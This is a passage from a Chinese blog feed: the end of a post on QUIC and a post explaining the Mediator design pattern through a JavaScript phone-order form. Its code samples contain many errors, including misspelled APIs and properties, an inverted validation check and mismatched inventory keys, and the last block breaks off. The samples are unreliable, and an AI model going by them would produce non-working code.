密钥等），就可以“无缝”地复用原连接，消除重连的成本，没有丝毫卡顿感，达到了<strong>连接迁移</strong>的功能。</p><p>所以， QUIC 是一个在 UDP 之上的<strong>伪</strong> TCP + TLS + HTTP&#x2F;2 的多路复用的协议。</p><p>QUIC 是新协议，对于很多网络设备，根本不知道什么是 QUIC，只会当做UDP，这样会出现新的问题，因为有的网络设备是会丢掉 UDP 包的，而QUIC 是基于 UDP 实现的，那么如果网络设备无法识别这个是 QUIC 包，那么就会当作 UDP包，然后被丢弃。</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;看本篇文章之前应先去看我的图解HTTP的博客&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id=&quot;2024-10-19&quot;&gt;&lt;a href=&quot;#2024-10-19&quot; class=&quot;headerlink&quot; title=&quot;2024.10.19&quot;&gt;&lt;/a&gt;2024.10.1</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://cychenhaibin.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>中介者模式</title>
    <link href="http://cychenhaibin.github.io/2024/10/13/%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/10/13/%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-10-13T04:22:47.000Z</published>
    <updated>2024-10-13T04:25:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>在我们生活的世界中，每个人每个物体之间都会产生一些错综复杂的联系。在应用程序里也一样，程序由大大小小的单一对象组成，所有这些对象都按照某种关系和规则来通信。</p><p>平时我们大概能记住10个朋友的电话、30家餐馆的位置。在程序里，也许一个对象会和其他10个对象打交道，所以它会保持10个对象的引用。当程序的规模增大，对象会越来越多，它们之间的关系也越来越复杂，难免会形成网状的交叉引用。当我们改变或删除其中个对象的时候，很可能需要通知所有引用到它的对象。这样一来，就像在心脏旁边拆掉一根毛细血管一般，唯一点很小的修改也必须小心翼翼。</p><p><img src="D:\Desktop\前端\img\image-20241008211245435.png" alt="image-20241008211245435"></p><p>面向对象设计鼓励将行为分布到各个对象中，把对象划分成更小的粒度，有助于增强对象的可复用性，但由于这些细粒度对象之间的联系激增，又有可能会反过来降低它们的可复用性。</p><p>中介者模式的作用就是解除对象与对象之间的紧耦合关系。增加一个中介者对象后，所有的相关对象都通过中介者对象来通信，而不是互相引用，所以当一个对象发生改变时，只需要通知中介者对象即可。中介者使各对象之间耦合松散，而且可以独立地改变它们之间的交互。中介者模式使网状的多对多关系变成了相对简单的一对多关系。</p><p><img src="D:\Desktop\前端\img\image-20241008223351989.png" alt="image-20241008223351989"></p><h3 id="一、现实中的中介者"><a href="#一、现实中的中介者" class="headerlink" title="一、现实中的中介者"></a>一、现实中的中介者</h3><ol><li><h4 id="机场指挥塔"><a href="#机场指挥塔" class="headerlink" title="机场指挥塔"></a>机场指挥塔</h4><p>中介者也被称为调停者，我们想象一下机场的指挥塔，如果没有指挥塔的存在，每架飞机要和方圆100公里内的所有飞机通信，才能确定航线以及飞行状况，后果是不可想象的。现实中的情况是，每架飞机都只需要和指挥塔通信。指挥塔作为调停者，知道每一架飞机的飞行状况，所以它可以安排所有飞机的起降时间，及时做出航线调整。</p></li><li><h4 id="博彩公司"><a href="#博彩公司" class="headerlink" title="博彩公司"></a>博彩公司</h4><p>打麻将的人经常遇到这样的问题，打了几局之后开始计算钱，A自摸了两把，B杠了三次，C点炮一次给D，谁应该给谁多少钱已经很难计算清楚，而这还是在只有4个人参与的情况下。</p><p>在世界杯期间购买足球彩票，如果没有博彩公司作为中介，上千万的人一起计算赔率和输赢绝对是不可能实现的事情。有了博彩公司作为中介，每个人只需和博彩公司发生关联，博彩公同会根据所有人的投注情况计算好赔率，彩民们赢了钱就从博彩公司拿，输了钱就交给博彩公司。</p></li></ol><h3 id="二、中介者模式的例子——购买商品"><a href="#二、中介者模式的例子——购买商品" class="headerlink" title="二、中介者模式的例子——购买商品"></a>二、中介者模式的例子——购买商品</h3><p>假设我们正在编写一个手机购买的页面，在购买流程中，可以选择手机的颜色以及输人购买数量，同时页面中有两个展示区域，分别向用户展示刚刚选择好的颜色和数量。还有一个按钮动态显示下一步的操作，我们需要查询该颜色手机对应的库存，如果库存数量少于这次的购买数量,按钮将被禁用并且显示库存不足，反之按钮可以点击并且显示放入购物车。</p><p>这个需求是非常容易实现的，假设我们已经提前从后台获取到了所有颜色手机的库存量:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> goods = &#123;</span><br><span class="line">    <span class="string">&quot;red&quot;</span>:<span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;blue&quot;</span>:<span class="number">6</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那么页面有可能显示为如下几种场景：</p><ul><li>选择红色手机，购买4个，库存不足。</li><li>选择蓝色手机，购买5个，库存充足，可以加入购物车。</li><li>或者是没有输入购买数量的时候，按钮将被禁用并显示相应提示。</li></ul><p>我们大概已经能够猜到，接下来将遇到至少5个节点，分别是：</p><ul><li>下拉选择框 colorSelect</li><li>文本输入框 numberInput</li><li>展示颜色信息 colorInfo</li><li>展示购买商品数量信息 numberInfo</li><li>决定下一步操作的按钮 nextBtn</li></ul><ol><li><h4 id="开始编写代码"><a href="#开始编写代码" class="headerlink" title="开始编写代码"></a>开始编写代码</h4><p>从编写HTML开始：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    选择颜色：</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;colorSelect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;red&quot;</span>&gt;</span>红色<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;blue&quot;</span>&gt;</span>蓝色<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    输入购买数量：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;numberInput&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    选择颜色：</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;colorInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    输入数量：</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;numberInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;nextBtn&quot;</span> <span class="attr">disable</span>=<span class="string">&quot;true&quot;</span>&gt;</span>请选择手机颜色和购买数量<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来监听colorSelect的onchange事件函数和numberInput的oninput事件函数，然后在这两个事件中作出相应的处理。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> colorSelect = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colorSelect&#x27;</span>),</span><br><span class="line">    numberInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;numberInput&#x27;</span>),</span><br><span class="line">    colorInfo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colorInfo&#x27;</span>),</span><br><span class="line">    numberInfo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;numberInfo&#x27;</span>),</span><br><span class="line">    nextBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nextBtn&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> goods = &#123;</span><br><span class="line">    <span class="string">&quot;red&quot;</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="string">&quot;blue&quot;</span>: <span class="number">6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">colorSelect.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> color = <span class="variable language_">this</span>.<span class="property">value</span>,  <span class="comment">// 颜色</span></span><br><span class="line">        number = numberInput.<span class="property">value</span>,  <span class="comment">// 数量</span></span><br><span class="line">        stock = goods[color];  <span class="comment">// 该颜色手机对应的当前库存</span></span><br><span class="line">    </span><br><span class="line">    colorInfo.<span class="property">innerHTML</span> = color;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!color)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择手机颜色&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">Number</span>.<span class="title function_">isInter</span>(number - <span class="number">0</span>) &amp;&amp; number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请输入正确的购买数量&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(number &gt; stock)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;库存不足&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;放入购物车&#x27;</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><h4 id="对象之间的联系"><a href="#对象之间的联系" class="headerlink" title="对象之间的联系"></a>对象之间的联系</h4><p>来考虑一下，当触发了colorselect 的onchange之后，会发生什么事情。</p><p>首先我们要让colorInfo中显示当前选中的颜色，然后获取用户当前输人的购买数量，对用户的输人值进行一些合法性判断。再根据库存数量来判断nextBtn的显示状态。</p><p>别忘了，还要编写numberInput的事件相关代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">numbernput.<span class="property">oninput</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> color = colorSelect.<span class="property">value</span>,    <span class="comment">// 颜色</span></span><br><span class="line">        number = <span class="variable language_">this</span>.<span class="property">value</span>,          <span class="comment">// 数量</span></span><br><span class="line">        stock = goods[color ];        <span class="comment">//该颜色子机对应的当前库存</span></span><br><span class="line">    </span><br><span class="line">    numberInfo.<span class="property">innerHML</span> = number;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!color )&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTM</span> = <span class="string">&#x27;请选择手机颜色&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(((number - <span class="number">0</span>) | <span class="number">0</span>) !== number - <span class="number">0</span>)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTM</span> = <span class="string">&#x27;请输入正确的购买数量&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(number &gt; stock)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;库存不足&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;放入购物车&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><h4 id="可能遇到的困难"><a href="#可能遇到的困难" class="headerlink" title="可能遇到的困难"></a>可能遇到的困难</h4><p>虽然目前顺利完成了代码编写，但随之而来的需求改变有可能给我们带来麻烦。假设现在要求去掉colorInfo和numberInfo这两个展示区域，我们就要分别改动 colorselect.onchange和numberInput. oninput里面的代码，因为在先前的代码中，这些对象确实是耦合在一起的。</p><p>目前我们面临的对象还不算太多，当这个页面里的节点激曾到10个或者15个时，它们之间的联系可能变得更加错综复杂，任何一次改动都将变得很棘手。为了证实这一点，我们假设页面中将新增另外一个下拉选择框，代表选择手机内存。现在我们需要计算颜色、内存和购买数量，来判断nextBtn是显示库存不足还是放人购物车。</p><p>首先我们要增加两个HTML汇节点：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    选择颜色：</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;colorSelect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;red&quot;</span>&gt;</span>红色<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;blue&quot;</span>&gt;</span>蓝色<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    选择内存：</span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;memorySelect&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span>请选择<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;32G&quot;</span>&gt;</span>32G<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;64G&quot;</span>&gt;</span>64G<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    输入购买数量：</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;numberInput&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    选择颜色：</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;colorInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    选择内存：</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;memoryInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    输入数量：</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;numberInfo&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;nextBtn&quot;</span> <span class="attr">disable</span>=<span class="string">&quot;true&quot;</span>&gt;</span>请选择手机颜色和购买数量<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> colorSelect = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colorSelect&#x27;</span>),</span><br><span class="line">    numberInput = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;numberInput&#x27;</span>),</span><br><span class="line">    colorInfo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;colorInfo&#x27;</span>),</span><br><span class="line">    numberInfo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;numberInfo&#x27;</span>),</span><br><span class="line">    memoryInfo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;memoryInfo&#x27;</span>),</span><br><span class="line">    nextBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;nextBtn&#x27;</span>);</span><br></pre></td></tr></table></figure><p>接下来修改表示库存的JSON对象以及修改colorSelect的onchange事件函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> goods = &#123;</span><br><span class="line">  <span class="string">&quot;red|3G&quot;</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">&quot;red|16G&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">&quot;blue|32G&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;blue|16G&quot;</span>: <span class="number">6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">colorSelect.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> color = <span class="variable language_">this</span>.<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> memory = memorySelect.<span class="property">value</span>;</span><br><span class="line">  <span class="keyword">var</span> stock = goods[color + <span class="string">&#x27;|&#x27;</span> + memory];</span><br><span class="line"></span><br><span class="line">  number = numberInput.<span class="property">value</span>,</span><br><span class="line">  colorInfo.<span class="property">innerHTML</span> = color;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!color)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择手机颜色&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!memory)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择内存大小&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(number - <span class="number">0</span>) &amp;&amp; number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请输入正确的购买数量&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(number &gt; stock)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;库存不足&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  nextBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">  nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;放入购物车&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然同样改写numberInput的事件相关代码，具体代码的改变跟colorSelect大同小异，最后还要新增memorySelect的onchange事件函数：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">memorySelect.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> color = colorSelect.<span class="property">value</span>, </span><br><span class="line">        memory = <span class="variable language_">this</span>.<span class="property">value</span>,</span><br><span class="line">        memory = <span class="variable language_">this</span>.<span class="property">value</span>,</span><br><span class="line">        stock = goods[color + <span class="string">&#x27;|&#x27;</span> + memory];</span><br><span class="line">    memoryInfo.<span class="property">innerHTML</span> = memory;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!color)&#123;</span><br><span class="line">        nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">        nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择手机颜色&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(!memory)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择内存大小&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(number - <span class="number">0</span>) &amp;&amp; number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请输入正确的购买数量&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(number &gt; stock)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;库存不足&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  nextBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">  nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;放入购物车&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们仅仅是增加了一个内存的选择条件，就要改变如此多的代码，这是因为在目前的实现中，每个节点对象都是耦合在一起的，改变或者增加任何一个节点对象，都要通知到与其相关的对象。</p></li><li><h4 id="引入中介者"><a href="#引入中介者" class="headerlink" title="引入中介者"></a>引入中介者</h4><p>现在引入中介者对象，所有的节点对象只跟中介者通信。当下拉框colorSelect、memorySelect和文本输入框numberInput发生了事件行为时，它们仅仅通知中介者它们被改变了，同时把自身当作参数传入中介者，以便中介者辨别是谁发生了改变。剩下的所有事情都交给中介者对象来完成，这样一来，无论是修改还是新增节点，都只需改动中介者对象里的代码。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> goods = &#123;</span><br><span class="line">  <span class="string">&quot;red|3G&quot;</span>: <span class="number">3</span>,</span><br><span class="line">  <span class="string">&quot;red|16G&quot;</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="string">&quot;blue|32G&quot;</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="string">&quot;blue|16G&quot;</span>: <span class="number">6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mediator = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> colorSelect = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;colorSelect&#x27;</span>),</span><br><span class="line">        memorySelect = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;memorySelect&#x27;</span>),</span><br><span class="line">        colorInfo = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;colorInfo&#x27;</span>),</span><br><span class="line">        memoryInfo = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;memoryInfo&#x27;</span>),</span><br><span class="line">        numberInfo = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;numberInfo&#x27;</span>),</span><br><span class="line">        nextBtn = <span class="variable language_">document</span>.<span class="title function_">getElementsById</span>(<span class="string">&#x27;nextBtn&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">changed</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> color = colorSelect.<span class="property">value</span>,</span><br><span class="line">                memory = memorySelect.<span class="property">value</span>,</span><br><span class="line">                number = numberInput.<span class="property">value</span>,</span><br><span class="line">                stock = goods[color + <span class="string">&#x27;|&#x27;</span> + memory];</span><br><span class="line">            <span class="keyword">if</span>(obj === colorSelect)&#123;</span><br><span class="line">                colorInfo.<span class="property">innerHTML</span> = color;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj === memorySelect)&#123;</span><br><span class="line">                memoryInfo.<span class="property">innerHTML</span> = memory;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj === numberInput)&#123;</span><br><span class="line">                numberInfo.<span class="property">innerHTML</span> = number;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(!memory)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请选择内存大小&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="title class_">Number</span>.<span class="title function_">isInteger</span>(number - <span class="number">0</span>) &amp;&amp; number &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;请输入正确的购买数量&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(number &gt; stock)&#123;</span><br><span class="line">    nextBtn.<span class="property">disabled</span> = <span class="literal">true</span>;</span><br><span class="line">    nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;库存不足&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  nextBtn.<span class="property">disabled</span> = <span class="literal">false</span>;</span><br><span class="line">  nextBtn.<span class="property">innerHTML</span> = <span class="string">&#x27;放入购物车&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 事件函数</span></span><br><span class="line">colorSelect.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    mediator.<span class="title function_">changed</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line">memorySelect.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    mediator.<span class="title function_">changed</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br><span class="line">numberInput.<span class="property">onInput</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    mediator.<span class="title function_">changed</span>(<span class="variable language_">this</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以想象，某天我们又要新增一些跟需求相关的节点，比如CPU型号，那我们只需要稍稍改动mediator对象即可：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> goods = &#123;</span><br><span class="line">  <span class="string">&quot;red|3G&quot;</span>: <span class="number">3</span>,</span><br><span class="line">  <span 